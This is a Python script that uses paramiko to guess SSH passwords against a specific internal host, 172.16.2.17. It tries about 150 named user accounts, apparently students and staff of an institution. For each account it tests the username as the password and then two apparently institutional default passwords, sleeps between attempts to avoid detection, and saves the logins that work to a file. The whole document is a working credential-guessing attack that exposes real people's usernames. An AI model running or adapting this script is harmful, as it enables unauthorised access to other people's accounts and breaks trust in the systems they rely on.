import paramiko
import socket
import time
from colorama import Fore, Style, init
usernames = [
    "bijit", "arup", "kaushik.das", "seema.nagar",
    "veronica.naosekpam", "kalyanee.devi", "hymavathi", "arunava.kalita",
    "june.lyngdoh", "sumona.biswas", "hirak", "amartya.dutta", "harshit.dixit",
    "anugunj.naman", "ayushman.singh", "om.prakash", "ojasv.singh",
    "sachin.agarwal", "shreyoshi.borah", "ansh.arora", "grid", "test",
    "mustakin.choudhury", "help", "debashree", "atharv.dabhade", "saurav.kumar",
    "jasmine.bajaj", "anand.shankar", "newtest", "upasana.talukdar",
    "pasumarthi.sreekar", "prithwish.sen", "jyotishna.kurmi", "nimish.agrawal",
    "mushtaq.islam", "singh.sanjay", "manashi.saharia", "moumita.roy",
    "nityanand.mathur", "harshit.singh", "ayush.singh", "shruti.sharan",
    "manashi.saharia22", "anurag.anand", "mayank.kumar", "aparajita.dutta",
    "uttirna.halder", "subhajit.ghosh", "amaresh.nara", "atiquzzaman.mondal",
    "tridib.roy21", "parashjyoti.borah", "shobhit.belwal", "dibyo", "rimpa.deka",
    "meghali.nandi", "mou.dutta", "suraj.kumar", "debaleena.chakraborty",
    "moirangthem.sonia21m", "rajiv.choudhury", "ishan.acharyya", "deepak.kumar",
    "shiksha.pandey21", "naman.nayal", "bondita.paul", "beerappa", "aayush.singh",
    "ravi.patel", "nilkanta.sahu", "mohit.mridul", "debleena.bhattacharjee",
    "aaryan.gupta", "angelish.db", "chandita.barman", "palathoti.raju",
    "raushan.k", "kashmiri.borah", "nitin.pasricha", "priyadarshi.chatterjee",
    "banoth.naik", "hritik.goyal", "harsh.singh", "franklin.buragohain",
    "sanjay.chouhanm22", "kakul.srivatsavam22", "Test", "priyadarshiTest",
    "kadam.devdas", "payel.sarmahm22", "kandukuru.sukumar", "kavthekar.balaji21b",
    "inampudi.kumar", "nvidia-persistenced", "arijit.nath", "jagtap.atharv21b",
    "satyam.kumar21b", "shreya.malik21b", "abhinav.kohali21b", "abhishek.kumar21b",
    "banuri.tharun", "toorpu.reddy", "shreyansh.dwivedi21b", "sujoy.paul23rs",
    "gaurav.choudhary", "chouhan.anjali21b", "ashutosh.pandey21b", "krishnandu",
    "hari", "bhavana.barman", "debanjana.chakraborty", "sanjib.singha", "babita",
    "pallela.chandhan21b", "csspl", "bittu.mishra", "jyotirmoy.nath23m",
    "vipul.nailwal", "ekha.morang", "shree.mitra23m", "ahlad.pataparla22b",
    "deepanika.gupta22b", "soumya.mitra22b", "rajat.amat", "aditya.jaiswal22b",
    "krish.kahnani22b", "divyraj.saini22b", "sudipto.ray22b",
    "vimal.narassimmane21b", "dipankar.sarma", "akshit.aggarwal",
    "akshat.kabra21b","sunny.mallick21b","yash.agrawal21b","gargee.handique"
]
def test_ssh_login(username, password, hostname, port=22):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname, port, username, password, timeout=5)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except (paramiko.SSHException, socket.error) as e:
        print(f"Error connecting to {username}@{hostname}: {str(e)}")
        return False

def main():
    init()  # Initialize colorama
    hostname = "172.16.2.17"
    successful_logins = []
    
    with open("successful_logins.txt", "w") as f:
        for username in usernames:
            success = test_ssh_login(username, username, hostname)
            if success:
                successful_logins.append(username)
                print(f"{Fore.GREEN}Successful login: {username}{Style.RESET_ALL}")
                f.write(f"{username} - {username}\n")
            else:
                time.sleep(15)
                success = test_ssh_login(username, "iiitg@abc", hostname)
                if success:
                    successful_logins.append(username)
                    print(f"{Fore.GREEN}Successful login: {username}{Style.RESET_ALL}")
                    f.write(f"{username} - iiitg@abc\n")
                else:
                    time.sleep(15)
                    success = test_ssh_login(username, "iiitg@123", hostname)
                    if success:
                        successful_logins.append(username)
                        print(f"{Fore.GREEN}Successful login: {username}{Style.RESET_ALL}")
                        f.write(f"{username} - iiitg@123\n")
                    else:
                        print(f"{Fore.RED}Failed login: {username}{Style.RESET_ALL}")
            
            time.sleep(15)  # Wait for 5 seconds before the next attempt
    
    if successful_logins:
        print("\nThe following accounts have successfully logged in:")
        for account in successful_logins:
            print(f"- {account}")
    else:
        print("\nNo accounts were able to log in successfully.")

if __name__ == "__main__":
    main()